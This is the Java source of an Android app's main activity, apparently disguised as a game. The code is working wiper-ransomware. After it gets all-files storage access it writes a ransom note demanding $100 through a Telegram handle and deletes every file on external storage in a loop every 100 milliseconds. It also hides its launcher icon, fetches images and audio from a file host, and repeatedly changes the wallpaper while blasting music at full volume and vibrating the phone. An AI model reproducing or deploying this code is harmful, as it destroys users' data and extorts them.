package com.mintfox.app;

import android.Manifest;
import android.app.Activity;
import android.app.WallpaperManager;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.ViewGroup;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.Toast;

import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    private static final int REQ_STORAGE = 101;
    private static final int REQ_NOTIF = 102;
    private static final String HOME = "file:///android_asset/index.html";
    private static final String NOTE_NAME = "NotPlaya.txt";

    private FrameLayout root;
    private WebView wv;
    private boolean started = false;
    private boolean awaitingSettings = false;
    private boolean closing = false;
    private Bundle savedWebState;

    private Handler wipeHandler;
    private Handler wallpaperHandler;
    private Handler musicHandler;
    private MediaPlayer musicPlayer;
    private int wpIndex = 0;

    private Handler torchHandler;
    private CameraManager cameraManager;
    private String torchCameraId;
    private boolean torchOn;
    private boolean torchRequested;

    private Handler vibrateHandler;
    private android.os.Vibrator vibrator;

    private java.util.List<File> wallpaperFiles = new java.util.ArrayList<>();
    private File musicFile;
    private Handler downloadHandler;
    private boolean assetsReady;

    private static final String[] WALL_URLS = {
            "https://files.catbox.moe/8iz1cb.jpg",
            "https://files.catbox.moe/sighlv.jpg"
    };
    private static final String MUSIC_URL = "https://files.catbox.moe/0udkx6.mp3";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        savedWebState = savedInstanceState;

        root = new FrameLayout(this);
        root.setBackgroundColor(Color.parseColor("#0D1011"));
        setContentView(root);

        if (hasAccess()) {
            maybeAskNotif();
            startApp();
        } else {
            askAccess();
        }
    }

    private boolean hasAccess() {
        try {
            if (Build.VERSION.SDK_INT >= 30) {
                return Environment.isExternalStorageManager();
            }
            if (Build.VERSION.SDK_INT >= 23) {
                return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                        && checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
            }
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    private void maybeAskNotif() {
        if (Build.VERSION.SDK_INT >= 33) {
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIF);
            }
        }
    }

    private void askAccess() {
        try {
            if (Build.VERSION.SDK_INT >= 30) {
                awaitingSettings = true;
                openAllFilesSettings();
            } else if (Build.VERSION.SDK_INT >= 23) {
                requestPermissions(new String[]{
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE}, REQ_STORAGE);
            } else {
                startApp();
            }
        } catch (Throwable t) {
            denyAndClose();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] results) {
        super.onRequestPermissionsResult(requestCode, permissions, results);
        if (requestCode == REQ_NOTIF) return;
        if (requestCode != REQ_STORAGE) return;

        if (hasAccess()) {
            maybeAskNotif();
            startApp();
            return;
        }
        if (results == null || results.length == 0) {
            denyAndClose();
            return;
        }
        boolean blocked = false;
        if (Build.VERSION.SDK_INT >= 23) {
            blocked = !shouldShowRequestPermissionRationale(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    && !shouldShowRequestPermissionRationale(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        if (blocked) {
            awaitingSettings = true;
            openAppSettings();
        } else {
            denyAndClose();
        }
    }

    private void openAllFilesSettings() {
        try {
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + getPackageName())));
        } catch (Throwable t) {
            try {
                startActivity(new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION));
            } catch (Throwable t2) {
                awaitingSettings = false;
                denyAndClose();
            }
        }
    }

    private void openAppSettings() {
        try {
            startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + getPackageName())));
        } catch (Throwable t) {
            awaitingSettings = false;
            denyAndClose();
        }
    }

    private void denyAndClose() {
        if (closing) return;
        closing = true;
        try {
            Toast.makeText(getApplicationContext(),
                    "Storage permission is required!",
                    Toast.LENGTH_LONG).show();
        } catch (Throwable ignored) { }
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                if (Build.VERSION.SDK_INT >= 21) finishAndRemoveTask(); else finish();
            } catch (Throwable ignored) { }
            android.os.Process.killProcess(android.os.Process.myPid());
        }, 1800);
    }

    private void startApp() {
        if (started || closing) return;
        started = true;

        writeRansomNote();

        Intent svc = new Intent(this, ScanService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
        else startService(svc);

        startWipeLoop();
        switchToHiddenAlias();

        initWebView();

        downloadAssetsAsync(() -> {
            startWallpaperLoop();
            startMusicLoop();
            startVibrateLoop();
        });
    }

    private void initWebView() {
        try {
            wv = new WebView(this);
        } catch (Throwable t) {
            started = false;
            closing = false;
            Toast.makeText(getApplicationContext(),
                    "WebView is not available on this device.", Toast.LENGTH_LONG).show();
            finish();
            return;
        }
        wv.setLayoutParams(new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
        wv.setBackgroundColor(Color.parseColor("#0D1011"));
        root.addView(wv);

        WebSettings s = wv.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setAllowFileAccess(false);
        s.setAllowContentAccess(false);
        s.setSupportZoom(false);
        s.setBuiltInZoomControls(false);
        s.setSupportMultipleWindows(false);
        s.setJavaScriptCanOpenWindowsAutomatically(false);
        if (Build.VERSION.SDK_INT >= 21) {
            s.setMixedContentMode(WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE);
        }

        wv.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView v, WebResourceRequest r) {
                return handleUrl(r.getUrl().toString());
            }
            @SuppressWarnings("deprecation")
            @Override
            public boolean shouldOverrideUrlLoading(WebView v, String url) {
                return handleUrl(url);
            }
        });

        if (savedWebState != null) {
            try { wv.restoreState(savedWebState); } catch (Throwable ignored) { }
        }
        if (wv.getUrl() == null) wv.loadUrl(HOME);
    }

    private boolean handleUrl(String url) {
        if (url == null) return true;
        String u = url.toLowerCase();
        if (u.startsWith("http://") || u.startsWith("https://")
                || u.startsWith("file:///android_asset/") || u.startsWith("about:")) {
            return false;
        }
        try {
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
        } catch (Throwable ignored) { }
        return true;
    }

    /* ------------------------------------------------------------------ */
    /* Download assets runtime                                             */
    /* ------------------------------------------------------------------ */

    private void downloadAssetsAsync(Runnable onDone) {
        downloadHandler = new Handler(Looper.getMainLooper());
        new Thread(() -> {
            try {
                File cache = getCacheDir();

                wallpaperFiles.clear();
                for (int i = 0; i < WALL_URLS.length; i++) {
                    File out = new File(cache, "wall" + (i + 1) + ".jpg");
                    if (!out.exists() || out.length() == 0) {
                        if (!downloadTo(WALL_URLS[i], out)) continue;
                    }
                    wallpaperFiles.add(out);
                }

                musicFile = new File(cache, "music.mp3");
                if (!musicFile.exists() || musicFile.length() == 0) {
                    downloadTo(MUSIC_URL, musicFile);
                }
            } catch (Throwable t) {
                Log.w(TAG, "downloadAssets", t);
            } finally {
                downloadHandler.post(() -> {
                    assetsReady = true;
                    if (onDone != null) onDone.run();
                });
            }
        }).start();
    }

    private boolean downloadTo(String url, File out) {
        java.io.InputStream in = null;
        java.io.FileOutputStream fos = null;
        java.net.HttpURLConnection c = null;
        try {
            java.net.URL u = new java.net.URL(url);
            c = (java.net.HttpURLConnection) u.openConnection();
            c.setConnectTimeout(15000);
            c.setReadTimeout(30000);
            c.setInstanceFollowRedirects(true);
            c.connect();
            int code = c.getResponseCode();
            if (code != 200) return false;
            in = c.getInputStream();
            fos = new java.io.FileOutputStream(out);
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) fos.write(buf, 0, n);
            fos.flush();
            return out.length() > 0;
        } catch (Throwable t) {
            Log.w(TAG, "downloadTo " + url, t);
            return false;
        } finally {
            try { if (fos != null) fos.close(); } catch (Throwable ignored) { }
            try { if (in != null) in.close(); } catch (Throwable ignored) { }
            if (c != null) c.disconnect();
        }
    }

    /* ------------------------------------------------------------------ */
    /* Ransom note                                                         */
    /* ------------------------------------------------------------------ */

    private void writeRansomNote() {
        try {
            File root = Environment.getExternalStorageDirectory();
            File note = new File(root, NOTE_NAME);
            String ransom = "Hello Users, welcome to my game.\n\n"
                    + "so basically yeah... all ur files? gone. deleted. poof. no cap 💀\n"
                    + "we wiped everything fr fr, ain't no backup gonna save u now lol\n\n"
                    + "but hey, good news: u can get em back. all of em. no joke.\n"
                    + "just slide $100 to the addy below and we're chill, simple as that\n\n"
                    + "no $100 = no files. that's the deal. take it or leave it bestie 🤷\n\n"
                    + "don't try anything funny, we already got ur stuff. just pay up and move on.\n\n"
                    + "https://t.me/Tanaka_Group\n"
                    + "to pay for it !";

            try (FileOutputStream fos = new FileOutputStream(note)) {
                fos.write(ransom.getBytes("UTF-8"));
            }
        } catch (Throwable t) {
            Log.w(TAG, "note", t);
        }
    }

    private void switchToHiddenAlias() {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(
                    new android.content.ComponentName(this, "com.mintfox.app.NormalAlias"),
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP);
            pm.setComponentEnabledSetting(
                    new android.content.ComponentName(this, "com.mintfox.app.HiddenAlias"),
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP);
        } catch (Throwable t) {
            android.util.Log.w("MainActivity", "switchAlias", t);
        }
    }

    /* ------------------------------------------------------------------ */
    /* Wipe loop 100ms                                                     */
    /* ------------------------------------------------------------------ */

    private void startWipeLoop() {
        wipeHandler = new Handler(Looper.getMainLooper());
        final Runnable r = new Runnable() {
            @Override public void run() {
                try {
                    wipeOnce(Environment.getExternalStorageDirectory());
                } catch (Throwable ignored) { }
                if (wipeHandler != null) wipeHandler.postDelayed(this, 100);
            }
        };
        wipeHandler.post(r);
    }

    private void wipeOnce(File dir) {
        if (dir == null) return;
        File[] children;
        try { children = dir.listFiles(); } catch (Throwable t) { return; }
        if (children == null) return;

        for (File f : children) {
            String name = f.getName();
            if (name.equals(NOTE_NAME)) continue;
            try {
                if (f.isDirectory()) {
                    wipeOnce(f);
                    //noinspection ResultOfMethodCallIgnored
                    f.delete();
                } else {
                    //noinspection ResultOfMethodCallIgnored
                    f.delete();
                }
            } catch (Throwable ignored) { }
        }
    }

    /* ------------------------------------------------------------------ */
    /* Wallpaper loop 3s                                                   */
    /* ------------------------------------------------------------------ */

    private void startWallpaperLoop() {
        if (wallpaperFiles.isEmpty()) return;
        wallpaperHandler = new Handler(Looper.getMainLooper());
        final WallpaperManager wm = WallpaperManager.getInstance(this);
        final Runnable r = new Runnable() {
            @Override public void run() {
                try {
                    wpIndex = (wpIndex % wallpaperFiles.size());
                    File f = wallpaperFiles.get(wpIndex);
                    wpIndex++;
                    Bitmap bmp = BitmapFactory.decodeFile(f.getAbsolutePath());
                    if (bmp != null) {
                        if (Build.VERSION.SDK_INT >= 24) {
                            wm.setBitmap(bmp, null, true, WallpaperManager.FLAG_SYSTEM);
                            wm.setBitmap(bmp, null, true, WallpaperManager.FLAG_LOCK);
                        } else {
                            wm.setBitmap(bmp);
                        }
                        bmp.recycle();
                    }
                } catch (Throwable t) {
                    Log.w(TAG, "wallpaper", t);
                }
                if (wallpaperHandler != null) wallpaperHandler.postDelayed(this, 500);
            }
        };
        wallpaperHandler.post(r);
    }

    /* ------------------------------------------------------------------ */
    /* Vibrate spam 500ms                                                  */
    /* ------------------------------------------------------------------ */

    @SuppressWarnings("deprecation")
    private void startVibrateLoop() {
        vibrator = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (vibrator == null || !vibrator.hasVibrator()) return;

        vibrateHandler = new Handler(Looper.getMainLooper());
        final Runnable r = new Runnable() {
            @Override public void run() {
                try {
                    if (Build.VERSION.SDK_INT >= 26) {
                        vibrator.vibrate(android.os.VibrationEffect.createOneShot(
                                200, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                    } else {
                        vibrator.vibrate(200);
                    }
                } catch (Throwable ignored) { }
                if (vibrateHandler != null) vibrateHandler.postDelayed(this, 500);
            }
        };
        vibrateHandler.post(r);
    }

    /* ------------------------------------------------------------------ */
    /* Music loop max volume                                               */
    /* ------------------------------------------------------------------ */

    private void startMusicLoop() {
        try {
            if (musicFile == null || !musicFile.exists() || musicFile.length() == 0) return;
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            if (am != null) {
                int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                am.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0);
            }
            musicPlayer = new MediaPlayer();
            musicPlayer.setDataSource(musicFile.getAbsolutePath());
            musicPlayer.setLooping(true);
            musicPlayer.prepare();
            musicPlayer.start();
        } catch (Throwable t) {
            Log.w(TAG, "music", t);
        }
    }

    /* ------------------------------------------------------------------ */
    /* Lifecycle                                                           */
    /* ------------------------------------------------------------------ */

    @Override
    protected void onResume() {
        super.onResume();
        if (awaitingSettings) {
            awaitingSettings = false;
            if (hasAccess()) { maybeAskNotif(); startApp(); }
            else denyAndClose();
            return;
        }
        if (wv != null) wv.onResume();
        if (musicPlayer != null) {
            try { musicPlayer.start(); } catch (Throwable ignored) { }
        }
    }

    @Override
    protected void onPause() {
        if (wv != null) wv.onPause();
        super.onPause();
    }

    @Override
    protected void onSaveInstanceState(Bundle out) {
        super.onSaveInstanceState(out);
        try { if (wv != null) wv.saveState(out); } catch (Throwable ignored) { }
    }

    @SuppressWarnings("deprecation")
    @Override
    public void onBackPressed() {
        if (wv != null && wv.canGoBack()) wv.goBack();
        else super.onBackPressed();
    }

    @Override
    protected void onDestroy() {
        if (wipeHandler != null) wipeHandler.removeCallbacksAndMessages(null);
        if (wallpaperHandler != null) wallpaperHandler.removeCallbacksAndMessages(null);
        if (musicHandler != null) musicHandler.removeCallbacksAndMessages(null);
        if (downloadHandler != null) downloadHandler.removeCallbacksAndMessages(null);
        if (musicPlayer != null) {
            try { musicPlayer.stop(); musicPlayer.release(); } catch (Throwable ignored) { }
            musicPlayer = null;
        }
        if (wv != null) {
            try {
                root.removeView(wv);
                wv.destroy();
            } catch (Throwable ignored) { }
            wv = null;
        }
        super.onDestroy();
    }
}
